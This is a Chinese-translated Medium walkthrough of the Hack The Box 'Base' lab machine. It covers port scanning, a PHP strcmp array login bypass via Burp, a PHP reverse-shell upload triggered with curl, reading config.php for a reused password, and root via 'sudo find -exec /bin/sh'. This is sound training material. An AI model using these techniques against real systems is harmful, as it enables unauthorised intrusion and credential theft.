<html>
<head>
<title>Base has been Pwned!</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">基地已经被pwn了！</h1>
<blockquote>原文：<a href="https://medium.com/geekculture/base-has-been-pwned-621c5a835036?source=collection_archive---------45-----------------------#2021-09-14">https://medium.com/geekculture/base-has-been-pwned-621c5a835036?source=collection_archive---------45-----------------------#2021-09-14</a></blockquote><div><div class="ds gw gx gy gz ha"/><div class="hb hc hd he hf"><div class=""/><figure class="ev ex ig ih ii ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es if"><img src="../Images/21a9ae1018c86a97a4a32992681f8062.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8QBCqQL7ddg7SUJCjfNFIw.png"/></div></div><figcaption class="iq ir et er es is it bd b be z dx">Base has been Pwned!</figcaption></figure><p id="9737" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">这是Hack The Box上起点类的最后一台机器。自从完成了上一台，我就一直期待着做这台机器。然而，按照传统的技术方式，我花了一晚上的时间试图找出为什么我的虚拟机总是崩溃。出于某种原因，它不断产生无效的内存地址寄存器。经过更新、重启和一些修补，它现在看起来很好。但这与此无关，所以让我们直接进入主题。</p><p id="7e47" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">好的，首先，在生成机器之后，我们ping它以检查它是否在线。</p><pre class="js jt ju jv fd jw jx jy jz aw ka bi"><span id="6dc1" class="kb kc hi jx b fi kd ke l kf kg">[10.10.14.57]─[joe@parrot]─[/media/sf_E_DRIVE/OneDrive/Hack The Box/Machines/Base/Output]<br/>└──╼ [★]$ sudo ping 10.10.10.48 | tee -a ping.10.10.10.48.txt<br/>PING 10.10.10.48 (10.10.10.48) 56(84) bytes of data.<br/>64 bytes from 10.10.10.48: icmp_seq=1 ttl=63 time=21.6 ms<br/>64 bytes from 10.10.10.48: icmp_seq=2 ttl=63 time=20.5 ms</span></pre><p id="f196" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">机器在和我们说话！我们需要它的地方就有它！是时候用nmap了。</p><pre class="js jt ju jv fd jw jx jy jz aw ka bi"><span id="755b" class="kb kc hi jx b fi kd ke l kf kg">[10.10.14.57]─[joe@parrot]─[/media/sf_E_DRIVE/OneDrive/Hack The Box/Machines/Base/Output]<br/>└──╼ [★]$ sudo nmap -sC -sV -O -p0- 10.10.10.48 | tee -a nmap.10.10.10.48.txx<br/>Starting Nmap 7.91 ( <a class="ae ki" href="https://nmap.org" rel="noopener ugc nofollow" target="_blank">https://nmap.org</a> ) at 2021–09–14 17:41 BST<br/>Nmap scan report for 10.10.10.48<br/>Not shown: 65534 closed ports<br/>PORT STATE SERVICE VERSION<br/>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br/>| ssh-hostkey:<br/>| 2048 f6:5c:9b:38:ec:a7:5c:79:1c:1f:18:1c:52:46:f7:0b (RSA)<br/>|_ 256 b8:65:cd:3f:34:d8:02:6a:e3:18:23:3e:77:dd:87:40 (ED25519)<br/><strong class="jx hj">80/tcp open http Apache httpd 2.4.29 ((Ubuntu))</strong><br/>|_http-server-header: Apache/2.4.29 (Ubuntu)<br/>|_http-title: Site doesn’t have a title (text/html)<br/>No exact OS matches for host (If you know what OS is running on it, see <a class="ae ki" href="https://nmap.org" rel="noopener ugc nofollow" target="_blank">https://nmap.org</a><br/>Network Distance: 2 hops<br/>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></pre><p id="bae8" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">看起来我们有一个运行在Ubuntu上的网络服务器。在我查看网站之前，我将启动一个dirb扫描来检查任何感兴趣的目录。</p><pre class="js jt ju jv fd jw jx jy jz aw ka bi"><span id="c740" class="kb kc hi jx b fi kd ke l kf kg">[10.10.14.57]─[joe@parrot]─[/media/sf_OneDrive/Hack The Box/Machines/Base/Scripts]<br/>└──╼ [★]$ sudo dirb <a class="ae ki" href="http://10.10.10.48" rel="noopener ugc nofollow" target="_blank">http://10.10.10.48</a> /usr/share/dirb/wordlists/big.txt -w<br/>— — — — — — — -<br/>DIRB v2.22 <br/>By The Dark Raver<br/>— — — — — — — — -<br/>START_TIME: Tue Sep 14 22:51:33 2021<br/>URL_BASE: <a class="ae ki" href="http://10.10.10.48/" rel="noopener ugc nofollow" target="_blank">http://10.10.10.48/</a><br/>WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt<br/>OPTION: Not Stopping on warning messages<br/> — — — — — — — — -<br/>GENERATED WORDS: 20458<br/>— — Scanning URL: <a class="ae ki" href="http://10.10.10.48/" rel="noopener ugc nofollow" target="_blank">http://10.10.10.48/</a> — — <br/>==&gt; DIRECTORY: <a class="ae ki" href="http://10.10.10.48/_uploaded/" rel="noopener ugc nofollow" target="_blank">http://10.10.10.48/_uploaded/</a> <br/>==&gt; DIRECTORY: <a class="ae ki" href="http://10.10.10.48/login/" rel="noopener ugc nofollow" target="_blank">http://10.10.10.48/login/</a> <br/>+ <a class="ae ki" href="http://10.10.10.48/server-status" rel="noopener ugc nofollow" target="_blank">http://10.10.10.48/server-status</a> (CODE:403|SIZE:276) <br/>==&gt; DIRECTORY: <a class="ae ki" href="http://10.10.10.48/static/" rel="noopener ugc nofollow" target="_blank">http://10.10.10.48/static/</a> <br/><strong class="jx hj">— — Entering directory: </strong><a class="ae ki" href="http://10.10.10.48/_uploaded/" rel="noopener ugc nofollow" target="_blank"><strong class="jx hj">http://10.10.10.48/_uploaded/</strong></a><strong class="jx hj"> — — <br/>(!) WARNING: Directory IS LISTABLE. No need to scan it.</strong> <br/> (Use mode ‘-w’ if you want to scan it anyway)<br/><strong class="jx hj">— — Entering directory: </strong><a class="ae ki" href="http://10.10.10.48/login/" rel="noopener ugc nofollow" target="_blank"><strong class="jx hj">http://10.10.10.48/login/</strong></a><strong class="jx hj"> — — <br/>(!) WARNING: Directory IS LISTABLE. No need to scan it. </strong><br/> (Use mode ‘-w’ if you want to scan it anyway)<br/><strong class="jx hj">- — Entering directory: </strong><a class="ae ki" href="http://10.10.10.48/static/" rel="noopener ugc nofollow" target="_blank"><strong class="jx hj">http://10.10.10.48/static/</strong></a><strong class="jx hj"> — — <br/>(!) WARNING: Directory IS LISTABLE. No need to scan it. </strong><br/> (Use mode ‘-w’ if you want to scan it anyway)<br/>==&gt; DIRECTORY: <a class="ae ki" href="http://10.10.10.48/static/fonts/" rel="noopener ugc nofollow" target="_blank">http://10.10.10.48/static/fonts/</a> <br/>==&gt; DIRECTORY: <a class="ae ki" href="http://10.10.10.48/static/images/" rel="noopener ugc nofollow" target="_blank">http://10.10.10.48/static/images/</a> </span></pre><p id="90b0" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">有趣的是，看起来服务器被配置为允许目录列表。这是重大的安全疏忽。这允许我们浏览目录并确定文件结构。这个设置可以很容易地在服务器配置中更改，但是现在让我们利用这个弱点并四处窥探。</p><figure class="js jt ju jv fd ij er es paragraph-image"><div class="er es kj"><img src="../Images/5a1ffae9ad8e92a5e4d63ceb823cad14.png" data-original-src="https://miro.medium.com/v2/resize:fit:1324/format:webp/1*ngAoKor20gqoScbyQ2O2-A.png"/></div><figcaption class="iq ir et er es is it bd b be z dx">Base directory listing /login</figcaption></figure><figure class="js jt ju jv fd ij er es paragraph-image"><div class="er es kk"><img src="../Images/6c6c847e9bf1b79ef9dbd493c33ee9ec.png" data-original-src="https://miro.medium.com/v2/resize:fit:1362/format:webp/1*MbXC3Fkv86dRKc2ScNgsMg.png"/></div><figcaption class="iq ir et er es is it bd b be z dx">Base directory listing /static</figcaption></figure><p id="cc47" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">服务器上有一些有趣的目录和文件，其中一个名为login.php.swp，包含以下php代码:</p><pre class="js jt ju jv fd jw jx jy jz aw ka bi"><span id="a521" class="kb kc hi jx b fi kd ke l kf kg">&lt;?php<br/>session_start();<br/>if (!empty($_POST[‘username’]) &amp;&amp; !empty($_POST[‘password’])) {<br/>require(‘config.php’);<br/>if (<strong class="jx hj">strcmp</strong>($username , $_POST[‘username’]) == 0) {<br/>if (<strong class="jx hj">strcmp</strong>($password, $_POST[‘password’]) == 0) {<br/>$_SESSION[‘user_id’] = 1;<br/>header(“Location: upload.php”)<br/>} else {<br/>print(“&lt;script&gt;alert(‘Wrong Username or Password’)&lt;/script&gt;”);<br/>}} else {<br/>print(“&lt;script&gt;alert(‘Wrong Username or Password’)&lt;/script&gt;”);<br/>}</span></pre><p id="8f6c" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">看起来好像用户名和密码被放入一个短的<a class="ae ki" href="https://www.php.net/manual/en/language.types.array.php" rel="noopener ugc nofollow" target="_blank">数组</a>并用<a class="ae ki" href="https://www.php.net/manual/en/function.strcmp.php" rel="noopener ugc nofollow" target="_blank"> strcmp </a>进行检查。通过拦截并改变<a class="ae ki" href="https://portswigger.net/burp" rel="noopener ugc nofollow" target="_blank"> Burp </a>中的请求，我们可以用自己的数组来破坏语法，并可以导致应用程序行为不当，有希望绕过认证。首先，我们需要导航到站点并提交一个登录请求。然后，我们需要确保浏览器被配置为向Burp发送请求，并且启用了Burp intercept。</p><figure class="js jt ju jv fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es kl"><img src="../Images/7d3f9b647feabf2ae6351037c56d0f9d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HyqeEiEcOWXEA2sbNISsNw.png"/></div></div><figcaption class="iq ir et er es is it bd b be z dx">Base web application login</figcaption></figure><p id="f026" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">第二，一旦Burp截获了请求，我们就需要稍微修改它来添加我们自己的空数组。在接收输入之前，需要将这些数组添加到用户名和密码的末尾。你可以从下面的截图中看到，我添加了一个左右方括号来添加数组。</p><figure class="js jt ju jv fd ij er es paragraph-image"><div class="er es km"><img src="../Images/028889d2e76afdbc60e0203383617a2c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1342/format:webp/1*p_Z1etqUUPA4CS7JuYddyA.png"/></div><figcaption class="iq ir et er es is it bd b be z dx">Burp intercept array manipulation</figcaption></figure><p id="cf33" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">最后，我们转发请求，以及后续的带有Burp的set-cookie请求，并等待web应用程序响应。我们被重定向到的页面是一个上传页面。我们从dirb结果中知道有一个_uploaded目录。如果我们假设这是文件上传放文件的地方，那么我们应该能够上传一个反向shell并从那里捕获它。</p><figure class="js jt ju jv fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es kn"><img src="../Images/5d2b0a8074e488aac6cf3b907d912509.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VxnEQO70AE9oremuYZmDhQ.png"/></div></div><figcaption class="iq ir et er es is it bd b be z dx">Base upload page</figcaption></figure><p id="3c47" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">我使用了<a class="ae ki" href="https://github.com/pentestmonkey/php-reverse-shell" rel="noopener ugc nofollow" target="_blank"> pentestermonkey的</a> PHP反向Shell，并上传到应用程序中。我启动了我的netcat监听器，然后卷曲URL来触发PHP反向shell。</p><pre class="js jt ju jv fd jw jx jy jz aw ka bi"><span id="65ef" class="kb kc hi jx b fi kd ke l kf kg">[10.10.14.57]─[joe@parrot]─[/media/sf_OneDrive/Hack The Box/Machines/Base/Scripts]<br/>└──╼ [★]$ sudo curl <a class="ae ki" href="http://10.10.10.48/_uploaded/shell.php" rel="noopener ugc nofollow" target="_blank">http://10.10.10.48/_uploaded/shell.php</a></span></pre><p id="f14c" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">不出所料。外壳起作用了，我得到了打开盒子的权限。在我们做任何事情之前，我们需要升级我们的shell，所以让我们运行Python 1 liner。</p><pre class="js jt ju jv fd jw jx jy jz aw ka bi"><span id="dce9" class="kb kc hi jx b fi kd ke l kf kg">$ python3 -c ‘import pty;pty.spawn(“/bin/bash”)’<br/>www-data@base:/$</span></pre><p id="1b69" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">既然这个问题已经解决了，让我们来看看其余的网站文件。当网站连接到数据库时，它们需要一个数据库配置文件。数据库配置文件包含可用于访问敏感信息的密码。还有其他像htaccess和htpasswd这样的文件也可能包含敏感信息，所以检查它们总是一个好主意。</p><pre class="js jt ju jv fd jw jx jy jz aw ka bi"><span id="7650" class="kb kc hi jx b fi kd ke l kf kg">www-data@base:/$ cat /var/www/html/login/config.php<br/>cat /var/www/html/login/config.php<br/>&lt;?php<br/>$username = “admin”;<br/>$password = “<strong class="jx hj">thisisagoodpassword</strong>”;</span></pre><p id="8ac5" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">【config.php】*沾沾自喜的露齿一笑加剧* 这个文件包含一个密码。我们知道这是登录应用程序所需的密码，但我们不知道它是否在系统的任何地方被重用过。记住这一点，让我们检查一下主目录，看看系统上有哪些用户。</p><pre class="js jt ju jv fd jw jx jy jz aw ka bi"><span id="8689" class="kb kc hi jx b fi kd ke l kf kg">www-data@base:/$ ls /home<br/>john<br/>www-data@base:/$ ls /home/john<br/>user.txt</span></pre><p id="774d" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated"><em class="kh">对不起，约翰，但是看起来你今天会成为我们的受害者。我知道你是个可爱的家伙，但是如果你重复使用了你的密码，那你就活该被pwn！(开玩笑，还是我？).</em>现在我们有了用户名和密码，让我们试着将用户切换到john。</p><pre class="js jt ju jv fd jw jx jy jz aw ka bi"><span id="52a5" class="kb kc hi jx b fi kd ke l kf kg">www-data@base:/$ su john<br/>su john<br/>Password: thisisagoodpassword<br/>john@base:/$</span></pre><p id="b34b" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">约翰，我相信你，但你让我失望了。当我们在这里时，让我们从johns主目录中获取用户标志。</p><pre class="js jt ju jv fd jw jx jy jz aw ka bi"><span id="d925" class="kb kc hi jx b fi kd ke l kf kg">john@base:/$ cat /home/john/user.txt<br/>cat /home/john/user.txt<br/>0011000100110011&lt;haXez&gt;0011001100110111</span></pre><p id="5fef" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">这样一来，让我们看看如何提升我们的提供和抓住根标志。我们首先需要知道的是约翰能跑什么，<em class="kh">除了他在落地时的安全姿势</em>。</p><pre class="js jt ju jv fd jw jx jy jz aw ka bi"><span id="f612" class="kb kc hi jx b fi kd ke l kf kg">john@base:/$ id<br/>uid=1000(john) gid=1000(john) groups=1000(john)</span><span id="6835" class="kb kc hi jx b fi ko ke l kf kg">john@base:/$ sudo -l<br/>[sudo] password for john: thisisagoodpassword<br/>Matching Defaults entries for john on base:<br/>env_reset, mail_badpass,<br/>secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br/>User john may run the following commands on base:<br/><strong class="jx hj">(root : root) /usr/bin/find</strong></span></pre><p id="dd94" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">john似乎有权以root用户身份运行find命令。<em class="kh">可惜他找不到更好的密码</em>。继续前进，我们应该检查find是否有任何逃脱的方法，就像我们用man命令执行的那个。为了做到这一点，我检查了网站<a class="ae ki" href="https://gtfobins.github.io/gtfobins/find/" rel="noopener ugc nofollow" target="_blank"> GTFOBins </a>，它说下面的命令可以用来逃离一个受限制的外壳。希望这意味着它会把我们丢进一个根壳。</p><pre class="js jt ju jv fd jw jx jy jz aw ka bi"><span id="4d6d" class="kb kc hi jx b fi kd ke l kf kg">john@base:/$ sudo find . -exec /bin/sh \; -quit<br/># whoami<br/>root</span></pre><p id="c99e" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">现在剩下要做的就是抓住根标志，我们完成了起点。</p><pre class="js jt ju jv fd jw jx jy jz aw ka bi"><span id="b456" class="kb kc hi jx b fi kd ke l kf kg"># cat /root/root.txt<br/>0011000100110011&lt;haXez&gt;0011001100110111</span></pre><figure class="js jt ju jv fd ij er es paragraph-image"><div class="er es kp"><img src="../Images/fe82b90b492c4e74e71447c3ba8f16a7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1216/format:webp/1*lt4nCF5_P0_oGjWAm4uErA.png"/></div><figcaption class="iq ir et er es is it bd b be z dx">Base has been Pwned!</figcaption></figure><p id="4d6f" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">这样一来，起点就完成了。是时候进入初学者轨道了。然而，看看我关于哈克斯的更多文章。</p><figure class="js jt ju jv fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es kq"><img src="../Images/63b8222db557043d1885f1dfcd4a8317.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*U5uaqcgwe_mj_KcBkYX-Pg.png"/></div></div><figcaption class="iq ir et er es is it bd b be z dx">Starting Point has been Pwned!</figcaption></figure></div></div>    
</body>
</html>